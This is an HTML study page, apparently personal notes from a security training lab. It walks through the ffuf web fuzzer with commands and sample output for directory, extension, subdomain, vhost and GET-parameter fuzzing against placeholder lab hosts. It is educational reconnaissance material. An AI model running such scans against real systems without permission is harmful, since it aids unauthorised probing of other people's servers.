<a href=javascript:history.back(); class=lightbox-back id=R-image-4e464509f3f12a5deb9b680bf2f88441><img alt=340ff374d2ef0ef2c9449372bb4e66cd.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/340ff374d2ef0ef2c9449372bb4e66cd.png></a></p><p>¬†</p><p>¬†</p><h2 id=ffuf>Ffuf</h2><p>Directory Fuzzing</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -h
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>HTTP OPTIONS:
</span></span><span style=display:flex><span>  -H               Header `&#34;Name: Value&#34;`, separated by colon. Multiple -H flags are accepted.
</span></span><span style=display:flex><span>  -X               HTTP method to use (default: GET)
</span></span><span style=display:flex><span>  -b               Cookie data `&#34;NAME1=VALUE1; NAME2=VALUE2&#34;` for copy as curl functionality.
</span></span><span style=display:flex><span>  -d               POST data
</span></span><span style=display:flex><span>  -recursion       Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
</span></span><span style=display:flex><span>  -recursion-depth Maximum recursion depth. (default: 0)
</span></span><span style=display:flex><span>  -u               Target URL
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>MATCHER OPTIONS:
</span></span><span style=display:flex><span>  -mc              Match HTTP status codes, or &#34;all&#34; for everything. (default: 200,204,301,302,307,401,403)
</span></span><span style=display:flex><span>  -ms              Match HTTP response size
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>FILTER OPTIONS:
</span></span><span style=display:flex><span>  -fc              Filter HTTP status codes from response. Comma separated list of codes and ranges
</span></span><span style=display:flex><span>  -fs              Filter HTTP response size. Comma separated list of sizes and ranges
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>INPUT OPTIONS:
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>  -w               Wordlist file path and (optional) keyword separated by colon. eg. &#39;/path/to/wordlist:KEYWORD&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>OUTPUT OPTIONS:
</span></span><span style=display:flex><span>  -o               Write output to file
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>EXAMPLE USAGE:
</span></span><span style=display:flex><span>  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
</span></span><span style=display:flex><span>  Colored, verbose output.
</span></span><span style=display:flex><span>    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v
</span></span><span style=display:flex><span>...SNIP...
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=directory-fuzzing>Directory Fuzzing</h2><p>assigning refrencesusinf :FUZZ</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>Now, let&rsquo;s start our target in the question below and run our final command on it:</p><p>Directory Fuzzing</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://SERVER_IP:PORT/FUZZ
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span>blog                    [Status: 301, Size: 326, Words: 20, Lines: 10]
</span></span><span style=display:flex><span>:: Progress: [87651/87651] :: Job [1/1] :: 9739 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=page-fuzzingextensions>Page Fuzzing(extensions)</h1><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ &lt;SNIP&gt;
</span></span></code></pre></div><p>¬†</p><p>Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after &ldquo;index&rdquo; in our fuzzing.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://SERVER_IP:PORT/blog/indexFUZZ
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 5
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>.php                    [Status: 200, Size: 0, Words: 1, Lines: 1]
</span></span><span style=display:flex><span>.phps                   [Status: 403, Size: 283, Words: 20, Lines: 10]
</span></span><span style=display:flex><span>:: Progress: [39/39] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
</span></span></code></pre></div><p>¬†</p><p>We do get a couple of hits, but only <code>.php</code> gives us a response with code <code>200</code>. Great! We now know that this website runs on <code>PHP</code> to start fuzzing for <code>PHP</code> files.</p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://SERVER_IP:PORT/blog/FUZZ.php
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
</span></span><span style=display:flex><span>REDACTED                [Status: 200, Size: 465, Words: 42, Lines: 15]
</span></span><span style=display:flex><span>:: Progress: [87651/87651] :: Job [1/1] :: 5843 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=recursive-flags>Recursive Flags</h2><p>¬†</p><p>In <code>ffuf</code>, we can enable recursive scanning with the <code>-recursion</code> flag, and we can specify the depth with the <code>-recursion-depth</code> flag. If we specify <code>-recursion-depth 1</code>, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like <code>/login/user</code>, it will not fuzz them for pages). When using recursion in <code>ffuf</code>, we can specify our extension with <code>-e .php</code></p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://SERVER_IP:PORT/FUZZ
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span style=display:flex><span> :: Extensions       : .php 
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 200, Size: 986, Words: 423, Lines: 56] | URL | http://SERVER_IP:PORT/
</span></span><span style=display:flex><span>    * FUZZ: 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[INFO] Adding a new job to the queue: http://SERVER_IP:PORT/forum/FUZZ
</span></span><span style=display:flex><span>[Status: 200, Size: 986, Words: 423, Lines: 56] | URL | http://SERVER_IP:PORT/index.php
</span></span><span style=display:flex><span>    * FUZZ: index.php
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 301, Size: 326, Words: 20, Lines: 10] | URL | http://SERVER_IP:PORT/blog | --&gt; | http://SERVER_IP:PORT/blog/
</span></span><span style=display:flex><span>    * FUZZ: blog
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;...SNIP...&gt;
</span></span><span style=display:flex><span>[Status: 200, Size: 0, Words: 1, Lines: 1] | URL | http://SERVER_IP:PORT/blog/index.php
</span></span><span style=display:flex><span>    * FUZZ: index.php
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 200, Size: 0, Words: 1, Lines: 1] | URL | http://SERVER_IP:PORT/blog/
</span></span><span style=display:flex><span>    * FUZZ: 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;...SNIP...&gt;
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=sub-domain-fuzzing>Sub-domain Fuzzing</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : https://FUZZ.inlanefreight.com/
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms]
</span></span><span style=display:flex><span>    * FUZZ: support
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 385ms]
</span></span><span style=display:flex><span>    * FUZZ: ns3
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 402ms]
</span></span><span style=display:flex><span>    * FUZZ: blog
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 180ms]
</span></span><span style=display:flex><span>    * FUZZ: my
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[Status: 200, Size: 22266, Words: 2903, Lines: 316, Duration: 589ms]
</span></span><span style=display:flex><span>    * FUZZ: www
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;...SNIP...&gt;
</span></span></code></pre></div><p>¬†</p><h2 id=vhosts-fuzzing>Vhosts Fuzzing</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.local:PORT/ -H &#39;Host: FUZZ.academy.local&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://academy.local:PORT/
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style=display:flex><span> :: Header           : Host: FUZZ
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>mail2                   [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>dns2                    [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>ns3                     [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>dns1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>lists                   [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>webmail                 [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>static                  [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>web                     [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>www1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
</span></span><span style=display:flex><span>&lt;...SNIP...&gt;
</span></span></code></pre></div><p>¬†</p><p><a href=#R-image-0aecfa0d125d967e5f85d258dfa39125 class=lightbox-link><img alt=0576ce273fef9b2d06c026192334a5c3.png class="lazy lightbox figure-image" loading=lazy src=../../resources/0576ce273fef9b2d06c026192334a5c3.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0aecfa0d125d967e5f85d258dfa39125><img alt=0576ce273fef9b2d06c026192334a5c3.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/0576ce273fef9b2d06c026192334a5c3.png></a></p><p>¬†</p><p>¬†filtering</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.local:PORT/ -H &#39;Host: FUZZ.academy.local&#39; -fs 900
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://academy.local:PORT/
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style=display:flex><span> :: Header           : Host: FUZZ.academy.local
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span> :: Filter           : Response size: 900
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;...SNIP...&gt;
</span></span><span style=display:flex><span>admin                   [Status: 200, Size: 0, Words: 1, Lines: 1]
</span></span><span style=display:flex><span>:: Progress: [4997/4997] :: Job [1/1] :: 1249 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=get-request-fuzzing>GET Request Fuzzing</h2><p>¬†</p><p>Similarly to how we have been fuzzing various parts of a website, we will use <code>ffuf</code> to enumerate parameters. Let us first start with fuzzing for <code>GET</code> requests, which are usually passed right after the URL, with a <code>?</code> symbol, like:</p><ul><li><code>http://admin.academy.local:PORT/admin/admin.php?param1=key</code>.</li></ul><p>So, all we have to do is replace <code>param1</code> in the example above with <code>FUZZ</code> and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, <code>SecLists</code> has just that in <code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code>. With that, we can run our scan.</p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php?FUZZ=key -fs xxx
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span style=display:flex><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span style=display:flex><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span style=display:flex><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span style=display:flex><span>         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span style=display:flex><span>          \/_/    \/_/   \/___/    \/_/       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>       v1.1.0-git
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://admin.academy.local:PORT/admin/admin.php?FUZZ=key
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-ff7a47385dccd87e25a11aab3b7152b8 class=lightbox-link><img alt=ba5807d848e303d5abfe134c50b9a6f6.png class="lazy lightbox figure-image" loading=lazy src=../../resources/ba5807d848e303d5abfe134c50b9a6f6.png style=height:auto;width:auto></a>
